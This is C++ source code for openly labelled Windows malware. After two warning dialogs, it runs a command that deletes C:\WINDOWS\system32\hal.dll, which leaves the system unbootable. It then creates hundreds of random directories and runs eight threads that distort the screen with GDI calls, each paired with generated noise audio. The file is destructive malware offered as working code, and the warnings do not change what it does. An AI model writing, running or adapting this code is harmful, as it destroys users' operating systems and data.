#include <windows.h>
#include <cmath>
#define USE_MATH_DEFINES 1
VOID WINAPI destruction()
{
     system("del C:\\WINDOWS\\system32\\hal.dll /Q");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
     system("Md %random%");
}
DWORD WINAPI payload1(LPVOID lpParam) 
{
    HWND desktop = GetDesktopWindow();
    RECT wRect;
    GetWindowRect(desktop, &wRect);
    POINT wPt[3];
    HDC hdc = GetDC(0);
    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrH = GetSystemMetrics(SM_CYSCREEN);
    int y = rand() % ScrH, h  = ScrH - rand()%ScrH - (ScrH / 2 - 109);
    int w = wRect.right - wRect.left;
    int r = wRect.bottom - wRect.top;
    int x = GetSystemMetrics(0), p = GetSystemMetrics(1);

    while (1)
    {
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 21 + 11;
    wPt[0].y = wRect.top + 90 + 30;
    wPt[1].x = wRect.right - 69 - 420;
    wPt[1].y = wRect.top + 71 - 69;
    wPt[2].x = wRect.left + 54 + 34;
    wPt[2].y = wRect.bottom - 75 - 40;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 21 + 11;
    wPt[0].y = wRect.top + 15 - 30;
    wPt[1].x = wRect.right + 61 - 51;
    wPt[1].y = wRect.top - 31 - 49;
    wPt[2].x = wRect.left - 84 - 83;
    wPt[2].y = wRect.bottom - 75 - 50;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    y = rand() % ScrH, h  = ScrH - rand()%ScrH - (ScrH / 2 - 109);
    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
    PatBlt(hdc, 0, y, ScrW, h, PATINVERT);
    StretchBlt(hdc, 50, 50, w - 100, r - 100, hdc , 0, 0, w, r, SRCCOPY);
    BitBlt(hdc, rand() % (x - 0), rand() % (p - 0), rand() % (x - 0), rand() % (p - 0), hdc, rand() % (x - 0), rand() % (p - 0), SRCCOPY);
    PatBlt(hdc, 0, 0, x, y, PATINVERT);
  }
}
DWORD WINAPI payload2(LPVOID lpParam) 
{
    HDC hdc = GetDC(0);
	RECT wRect;
    POINT wPt[3];
	while (1)
	{
	GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 50 + 60;
    wPt[0].y = wRect.top + 70 + 30;
    wPt[1].x = wRect.right + 10 + 0;
    wPt[1].y = wRect.top + 50 + 65;
    wPt[2].x = wRect.left + 10 + 26;
    wPt[2].y = wRect.bottom + 80 + 99;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
   }
}
DWORD WINAPI payload3(LPVOID lpParam) 
{
	HDC hdc = GetDC(0);
    RECT wRect;
    POINT wPt[3];
    while (1)
    {
    GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 71 + 1;
    wPt[0].y = wRect.top + 12 + 30;
    wPt[1].x = wRect.right + 18 + 5;
    wPt[1].y = wRect.top + 71 + 16;
    wPt[2].x = wRect.left - 15 - 34;
    wPt[2].y = wRect.bottom - 62 - 10;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
    }
}
DWORD WINAPI payload4(LPVOID lpParam) 
{
	HDC hdc = GetDC(0);
	RECT wRect;
    POINT wPt[3];
	while (1)
	{
	GetWindowRect(GetDesktopWindow(), &wRect);
    wPt[0].x = wRect.left + 1 + 1;
    wPt[0].y = wRect.top + 7 + 6;
    wPt[1].x = wRect.right + 2 + 3;
    wPt[1].y = wRect.top + 5 + 9;
    wPt[2].x = wRect.left + 2 + 6;
    wPt[2].y = wRect.bottom + 0 + 3;
    PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
   }
}
DWORD WINAPI payload5(LPVOID lpParam)
{
	HWND desktop = GetDesktopWindow();
    HDC hdc = GetDC(0);
    RECT wRect;
    GetWindowRect(desktop, &wRect);
    int x = wRect.right - wRect.left;
    int y = wRect.bottom + wRect.top;
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);

    while (1)
    {
        SelectObject(hdc, CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255)));
        StretchBlt(hdc, rand()%50, rand()%50, x - 100, y - 100, hdc, 0, 0, x, y, SRCCOPY);
        BitBlt(hdc, rand() % 1, rand() % 1, sw, sh, hdc, rand() % 1, rand() % 1, 0x2837E28);
    }

}
DWORD WINAPI payload6(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CXSCREEN);
	while (1) 
	{	
	    int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
        for (int t = 0; t < sw + sh; ++t) {
        int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),
        y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
		Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		Sleep(20);
		InvalidateRect(0, 0, 0);
	}
  }
}
DWORD WINAPI payload7(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while(1)
	{
		StretchBlt(desk, 1, 1, sw - 2, sh - 2, desk, 0, 0, sw, sh, SRCPAINT);
		Sleep(300);
	}
}
DWORD WINAPI payload8(LPVOID lpParam)
{
    HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while(1)
	{
		StretchBlt(desk, 1, 1, sw - 2, sh - 2, desk, 0, 0, sw, sh, SRCAND);
		Sleep(300);
	}
}
VOID WINAPI audio1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*t>>213|t>>4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*t>>3|t>>5|t>>32134);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*((t>>9|t>>13)&5))&129;
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t*((t>>6|t>>1)&345))&129;
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>( t * ( t >> ( t >> 23343578439 & t ) ) );
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>( t * ( t >> ( t >> 2 & t ) ) );
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audio7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>4>>2151|857)*(4|t%1|t%123);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI audiolast() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
    buffer[t] = static_cast<char>(t>>1>>2121|857)*(4|t%1|t%123);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    if (MessageBoxW(NULL, L"The software you just executed malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test such as a virtual machine, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"!! WARNING RIDE OF DOOM INCOMING INTO TOTAL MAYHEM !!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"!! LAST WARNING !!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            destruction();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            audio1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            audio2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            audio3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            audio4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            audio5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            audio6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            audio7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
            audiolast();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
        }
    }
}
